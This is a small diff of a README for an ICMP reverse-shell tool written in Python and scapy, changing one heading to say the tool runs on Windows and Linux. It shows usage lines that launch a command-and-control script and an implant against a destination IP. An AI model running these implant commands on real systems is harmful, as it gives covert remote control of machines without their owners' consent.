@@ -3,7 +3,7 @@ ICMP reverse shell written in Python3 and scapy. Tested on Ubuntu 20.04, Debian 
 
 More info: https://cryptsus.com/blog/icmp-reverse-shell.html
 
-Python version:
+Python version (both Windows and Linux):
 ```bash
 ./icmp-cnc.py -i INTERFACE -d DESTINATION_IP (Command and Control)
 ./icmpdoor.py -i INTERFACE -d DESTINATION_IP (Implant)
